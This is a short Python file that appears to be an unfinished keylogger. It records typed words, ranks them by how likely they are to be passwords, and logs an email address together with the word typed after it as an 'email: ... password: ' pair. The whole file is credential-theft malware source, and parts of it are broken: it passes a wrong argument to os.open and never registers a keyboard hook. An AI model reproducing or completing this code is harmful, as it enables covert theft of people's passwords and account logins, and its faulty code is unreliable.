import keyboard
import os
import re
from typing import IO

def open_logged_keys_file(path):
    return os.open(path, "a")

def word_priority_predictor(word: str)->int:
    #Matches any string that is longer than 7, as most passwords usually are
    length_regex = re.compile(r'^.{8,}$')
    #Matches any string that includes a mix of uppercase and lowercase letters, numbers, and special characters, which is usually a password requirement
    special_char_regex = re.compile(r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-])\S+$')

    if length_regex.match(word):
        if special_char_regex.match(word):
            return 0
        else:
            return 1
    return 2

def read_word_being_typed():
    word:str = ""
    def closure(event: keyboard.KeyboardEvent):
        nonlocal word #to create a closure
        if event.name == "enter" or event.name == "space":
            return word, word_priority_predictor(word)
        else:
            #If only one character was entered, to avoid saving keyboard events like tab ctrl etc
            if len(event.name)==1:
                word+=event.name
            #Means it's not a complete word, that we can save
            return False
    return closure

def email_check(word: str):
    email_regex = re.compile('^[\w+\-.]+@[a-z\d\-]+(\.[a-z\d\-]+)*\.[a-z]+$')
    return email_regex.match(word)



def update_logged_keys_file(word: str, priority: int, file: IO):
    #If the word is an email then we dont add a newspace character cause it's likely the password will come after it, and also we want the emails to have the same priority as their corresponding password
    file.write("email: "+ word +" password: ") if email_check(word) else file.write(word+" "+str(priority)+"\n") 

    

